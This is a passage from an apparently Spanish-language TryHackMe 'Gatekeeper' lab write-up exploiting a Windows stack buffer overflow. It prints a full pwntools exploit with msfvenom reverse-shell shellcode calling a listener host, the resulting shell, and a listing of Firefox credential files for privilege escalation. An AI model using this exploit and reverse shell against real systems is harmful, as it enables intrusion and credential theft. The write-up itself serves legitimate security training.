Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk
</span></span></code></pre></div><p>Para que calcule automáticamente el offset, con mona pattern_offset, le pasamos el valor del EIP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona pattern_offset <span class=m>39654138</span>
</span></span></code></pre></div><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/gatekeeper/images/3_hud1d2e2c4392d2ac644eec46d1a21d6e4_16713_472469c44084c5edcba677e104860207.webp 480w, /writeups/tryhackme/gatekeeper/images/3_hud1d2e2c4392d2ac644eec46d1a21d6e4_16713_38afed0d80aaaa575eef04857f5ee5dd.webp 640w, /writeups/tryhackme/gatekeeper/images/3_hud1d2e2c4392d2ac644eec46d1a21d6e4_16713_6a6db40d28a15bd16804f3018f5f8f8e.webp 800w, /writeups/tryhackme/gatekeeper/images/3_hud1d2e2c4392d2ac644eec46d1a21d6e4_16713_831841c09070f74bc6b8e825a5d2eb6f.webp 1024w" fetchpriority=low height=900 id=h-rh-i-2 src=/writeups/tryhackme/gatekeeper/images/3_hud1d2e2c4392d2ac644eec46d1a21d6e4_16713_84755cffbdcb85ceb6ec873e0a646be0.webp width=1600></p><p>Ha encontrado que el offset es de 146, esto significa que tenemos que poner 146 caracteres para conseguir llegar a sobreescribir el EIP</p><p>El siguiente paso es comprobar si hay algún badchar, para ello creamos una lista de bytes con:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona bytearray -b <span class=s2>&#34;\x00&#34;</span>
</span></span></code></pre></div><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/gatekeeper/images/4_hu4fbab0ad68df4728de14f2a3d52dd89c_44064_131b1136b131db226f0a8426b54a7d11.webp 480w, /writeups/tryhackme/gatekeeper/images/4_hu4fbab0ad68df4728de14f2a3d52dd89c_44064_902294546a8f065e1a884be2393e49ab.webp 640w, /writeups/tryhackme/gatekeeper/images/4_hu4fbab0ad68df4728de14f2a3d52dd89c_44064_0605b2fe259b29af83845dd89d17b73d.webp 800w, /writeups/tryhackme/gatekeeper/images/4_hu4fbab0ad68df4728de14f2a3d52dd89c_44064_9f963629fddc1c6814bed4e64a6d696c.webp 1024w" fetchpriority=low height=900 id=h-rh-i-3 src=/writeups/tryhackme/gatekeeper/images/4_hu4fbab0ad68df4728de14f2a3d52dd89c_44064_4b223f245f7793020ebf2836cc8e3219.webp width=1600></p><p>Vamos a usar el siguiente script para mandar todos los bytes</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>pack</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>146</span>
</span></span><span class=line><span class=cl><span class=n>before_eip</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>eip</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;BBBB&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>badchars</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>badchars</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>badchars</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>badchars</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>badchars</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>badchars</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>badchars</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>badchars</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>before_eip</span> <span class=o>+</span> <span class=n>eip</span> <span class=o>+</span> <span class=n>badchars</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;192.168.1.142&#34;</span><span class=p>,</span> <span class=s2>&#34;31337&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>Desde immunity debbuger podemos ver todos los bytes que hemos mandado</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/gatekeeper/images/5_hueedc06052bf471fc5e7798934bf250e1_7870_f3487487dba5d5c5423eda727bfe7117.webp 480w, /writeups/tryhackme/gatekeeper/images/5_hueedc06052bf471fc5e7798934bf250e1_7870_47e88c8d862cd8303a2d228a8cd3bac7.webp 640w, /writeups/tryhackme/gatekeeper/images/5_hueedc06052bf471fc5e7798934bf250e1_7870_a9ff667ca794cc365d337d1828304145.webp 800w, /writeups/tryhackme/gatekeeper/images/5_hueedc06052bf471fc5e7798934bf250e1_7870_8270cfc50f4f45cf3ccdb43ab1cf73d8.webp 1024w" fetchpriority=low height=900 id=h-rh-i-4 src=/writeups/tryhackme/gatekeeper/images/5_hueedc06052bf471fc5e7798934bf250e1_7870_d35e56592da69ec62271cb025bc34258.webp width=1600></p><p>Para comprobar que ningún byte de problemas, usamos !mona compare, donde le pasamos el archivo bytearray.bin que nos creó anteriormente, y también le pasamos la dirección donde empieza la cadena de badchars</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona compare -f C:<span class=se>\U</span>sers<span class=se>\a</span>rnau<span class=se>\D</span>esktop<span class=se>\b</span>of<span class=se>\b</span>ytearray.bin -a 016319F8
</span></span></code></pre></div><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/gatekeeper/images/6_hud2909838636f49900a7c76851a92d98c_21625_0834fbf5f895e26253f0250ee26c675f.webp 480w, /writeups/tryhackme/gatekeeper/images/6_hud2909838636f49900a7c76851a92d98c_21625_8aea9aaa62ce850f9c558363f50a7056.webp 640w, /writeups/tryhackme/gatekeeper/images/6_hud2909838636f49900a7c76851a92d98c_21625_9cdf5c5a70b3feeaf524223e9c246cae.webp 800w, /writeups/tryhackme/gatekeeper/images/6_hud2909838636f49900a7c76851a92d98c_21625_764c6016eb4c6c80757472b42961491a.webp 1024w" fetchpriority=low height=900 id=h-rh-i-5 src=/writeups/tryhackme/gatekeeper/images/6_hud2909838636f49900a7c76851a92d98c_21625_c03c37c07c4d455bf0cac41a165a62cb.webp width=1600></p><p>Ha encontrado 2 badchars [\x00, \x0a]</p><p>Para explotar el BoF, tenemos que poner en el EIP una dirección de salto al ESP donde va a estar nuestro shellcode</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona find -s <span class=s2>&#34;\xFF\xE4&#34;</span> -m gatekeeper.exe
</span></span></code></pre></div><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/gatekeeper/images/7_hu9583fd96e6f663125ef834c1c70f4a1d_11239_b48494c5c5c620ff80c07ec0778d4b38.webp 480w, /writeups/tryhackme/gatekeeper/images/7_hu9583fd96e6f663125ef834c1c70f4a1d_11239_322c9cd1cffa4acd38869d98669f8355.webp 640w, /writeups/tryhackme/gatekeeper/images/7_hu9583fd96e6f663125ef834c1c70f4a1d_11239_313aa04b8824a90f8d786e8c97d7df0f.webp 800w, /writeups/tryhackme/gatekeeper/images/7_hu9583fd96e6f663125ef834c1c70f4a1d_11239_412e3fb851bfb67f5158d9286271a2b0.webp 1024w" fetchpriority=low height=900 id=h-rh-i-6 src=/writeups/tryhackme/gatekeeper/images/7_hu9583fd96e6f663125ef834c1c70f4a1d_11239_ce21249c3f5494336a2444b0546c14de.webp width=1600></p><p>Podemos usar cualquiera de las 2, ya que las dos tienen {PAGE_EXECUTE_READ}</p><p>Por último creamos el shellcode, donde especificamos los badchars que hemos encontrado durante el reconocimiento del programa</p><pre tabindex=0><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.150 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f py -b &#34;\x00\x0a&#34; EXITFUNC=thread

buf =  b&#34;&#34;
buf += b&#34;\xbf\x4f\x6e\xb7\x71\xd9\xc0\xd9\x74\x24\xf4\x58&#34;
buf += b&#34;\x29\xc9\xb1\x52\x31\x78\x12\x03\x78\x12\x83\x8f&#34;
buf += b&#34;\x6a\x55\x84\xf3\x9b\x1b\x67\x0b\x5c\x7c\xe1\xee&#34;
buf += b&#34;\x6d\xbc\x95\x7b\xdd\x0c\xdd\x29\xd2\xe7\xb3\xd9&#34;
buf += b&#34;\x61\x85\x1b\xee\xc2\x20\x7a\xc1\xd3\x19\xbe\x40&#34;
buf += b&#34;\x50\x60\x93\xa2\x69\xab\xe6\xa3\xae\xd6\x0b\xf1&#34;
buf += b&#34;\x67\x9c\xbe\xe5\x0c\xe8\x02\x8e\x5f\xfc\x02\x73&#34;
buf += b&#34;\x17\xff\x23\x22\x23\xa6\xe3\xc5\xe0\xd2\xad\xdd&#34;
buf += b&#34;\xe5\xdf\x64\x56\xdd\x94\x76\xbe\x2f\x54\xd4\xff&#34;
buf += b&#34;\x9f\xa7\x24\x38\x27\x58\x53\x30\x5b\xe5\x64\x87&#34;
buf += b&#34;\x21\x31\xe0\x13\x81\xb2\x52\xff\x33\x16\x04\x74&#34;
buf += b&#34;\x3f\xd3\x42\xd2\x5c\xe2\x87\x69\x58\x6f\x26\xbd&#34;
buf += b&#34;\xe8\x2b\x0d\x19\xb0\xe8\x2c\x38\x1c\x5e\x50\x5a&#34;
buf += b&#34;\xff\x3f\xf4\x11\x12\x2b\x85\x78\x7b\x98\xa4\x82&#34;
buf += b&#34;\x7b\xb6\xbf\xf1\x49\x19\x14\x9d\xe1\xd2\xb2\x5a&#34;
buf += b&#34;\x05\xc9\x03\xf4\xf8\xf2\x73\xdd\x3e\xa6\x23\x75&#34;
buf += b&#34;\x96\xc7\xaf\x85\x17\x12\x7f\xd5\xb7\xcd\xc0\x85&#34;
buf += b&#34;\x77\xbe\xa8\xcf\x77\xe1\xc9\xf0\x5d\x8a\x60\x0b&#34;
buf += b&#34;\x36\x75\xdc\x12\x50\x1d\x1f\x14\x5d\x65\x96\xf2&#34;
buf += b&#34;\x37\x89\xff\xad\xaf\x30\x5a\x25\x51\xbc\x70\x40&#34;
buf += b&#34;\x51\x36\x77\xb5\x1c\xbf\xf2\xa5\xc9\x4f\x49\x97&#34;
buf += b&#34;\x5c\x4f\x67\xbf\x03\xc2\xec\x3f\x4d\xff\xba\x68&#34;
buf += b&#34;\x1a\x31\xb3\xfc\xb6\x68\x6d\xe2\x4a\xec\x56\xa6&#34;
buf += b&#34;\x90\xcd\x59\x27\x54\x69\x7e\x37\xa0\x72\x3a\x63&#34;
buf += b&#34;\x7c\x25\x94\xdd\x3a\x9f\x56\xb7\x94\x4c\x31\x5f&#34;
buf += b&#34;\x60\xbf\x82\x19\x6d\xea\x74\xc5\xdc\x43\xc1\xfa&#34;
buf += b&#34;\xd1\x03\xc5\x83\x0f\xb4\x2a\x5e\x94\xd4\xc8\x4a&#34;
buf += b&#34;\xe1\x7c\x55\x1f\x48\xe1\x66\xca\x8f\x1c\xe5\xfe&#34;
buf += b&#34;\x6f\xdb\xf5\x8b\x6a\xa7\xb1\x60\x07\xb8\x57\x86&#34;
buf += b&#34;\xb4\xb9\x7d&#34;
</code></pre><p>Ahora solo falta ponernos en escucha <code>rlwrap nc -nlvp 443</code> y modificar el exploit, donde metemos el shellcode creado con msfvenom</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>pack</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>146</span>
</span></span><span class=line><span class=cl><span class=n>before_eip</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>eip</span> <span class=o>=</span> <span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=mh>0x080416bf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span>  <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xbf\x4f\x6e\xb7\x71\xd9\xc0\xd9\x74\x24\xf4\x58</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x29\xc9\xb1\x52\x31\x78\x12\x03\x78\x12\x83\x8f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x6a\x55\x84\xf3\x9b\x1b\x67\x0b\x5c\x7c\xe1\xee</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x6d\xbc\x95\x7b\xdd\x0c\xdd\x29\xd2\xe7\xb3\xd9</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x61\x85\x1b\xee\xc2\x20\x7a\xc1\xd3\x19\xbe\x40</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x50\x60\x93\xa2\x69\xab\xe6\xa3\xae\xd6\x0b\xf1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x67\x9c\xbe\xe5\x0c\xe8\x02\x8e\x5f\xfc\x02\x73</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x17\xff\x23\x22\x23\xa6\xe3\xc5\xe0\xd2\xad\xdd</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xe5\xdf\x64\x56\xdd\x94\x76\xbe\x2f\x54\xd4\xff</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x9f\xa7\x24\x38\x27\x58\x53\x30\x5b\xe5\x64\x87</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x21\x31\xe0\x13\x81\xb2\x52\xff\x33\x16\x04\x74</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x3f\xd3\x42\xd2\x5c\xe2\x87\x69\x58\x6f\x26\xbd</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xe8\x2b\x0d\x19\xb0\xe8\x2c\x38\x1c\x5e\x50\x5a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xff\x3f\xf4\x11\x12\x2b\x85\x78\x7b\x98\xa4\x82</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x7b\xb6\xbf\xf1\x49\x19\x14\x9d\xe1\xd2\xb2\x5a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x05\xc9\x03\xf4\xf8\xf2\x73\xdd\x3e\xa6\x23\x75</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x96\xc7\xaf\x85\x17\x12\x7f\xd5\xb7\xcd\xc0\x85</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x77\xbe\xa8\xcf\x77\xe1\xc9\xf0\x5d\x8a\x60\x0b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x36\x75\xdc\x12\x50\x1d\x1f\x14\x5d\x65\x96\xf2</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x37\x89\xff\xad\xaf\x30\x5a\x25\x51\xbc\x70\x40</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x51\x36\x77\xb5\x1c\xbf\xf2\xa5\xc9\x4f\x49\x97</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x5c\x4f\x67\xbf\x03\xc2\xec\x3f\x4d\xff\xba\x68</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x1a\x31\xb3\xfc\xb6\x68\x6d\xe2\x4a\xec\x56\xa6</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90\xcd\x59\x27\x54\x69\x7e\x37\xa0\x72\x3a\x63</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x7c\x25\x94\xdd\x3a\x9f\x56\xb7\x94\x4c\x31\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x60\xbf\x82\x19\x6d\xea\x74\xc5\xdc\x43\xc1\xfa</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xd1\x03\xc5\x83\x0f\xb4\x2a\x5e\x94\xd4\xc8\x4a</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xe1\x7c\x55\x1f\x48\xe1\x66\xca\x8f\x1c\xe5\xfe</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x6f\xdb\xf5\x8b\x6a\xa7\xb1\x60\x07\xb8\x57\x86</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xb4\xb9\x7d</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>eip</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>before_eip</span> <span class=o>+</span> <span class=n>eip</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>16</span> <span class=o>+</span> <span class=n>buf</span>
</span></span><span class=line><span class=cl><span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;192.168.1.142&#34;</span><span class=p>,</span> <span class=mi>31337</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>Si quieres ver una explotación de un BoF más a detalle te recomiendo que te mires el writeup de la máquina Buff y Brainpan</p><p>Ejecutamos el script&mldr;. Y estamos dentro!</p><pre tabindex=0><code>connect to [192.168.1.150] from (UNKNOWN) [192.168.1.142] 49184
Microsoft Windows [Versi�n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Users\arnau\Desktop&gt;
</code></pre><p>Estamos dentro, sí, pero no de la máquina víctima, sino de mi máquina, así que tenemos que modificar el payload y el exploit con las ip correspondientes de tryhackme.</p><pre tabindex=0><code>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop&gt;
</code></pre><p>Ahora sí estamos dentro.</p><h2 id=escalada-de-privilegios>Escalada de privilegios<a href=#escalada-de-privilegios class=anchor aria-hidden=true>#</a></h2><p>Empezamos con un reconocimiento listando el contenido de: <code>C:\Users\natbat</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat&gt;dir /S /B
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\k</span>ey4.db
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\l</span>ogins.json
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\m</span>inidumps
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\p</span>arent.lock
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\p</span>ermissions.sqlite
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\n</span>atbat<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\l</span>jfn812a.default-release<span class=se>\p</span>kcs11.txt
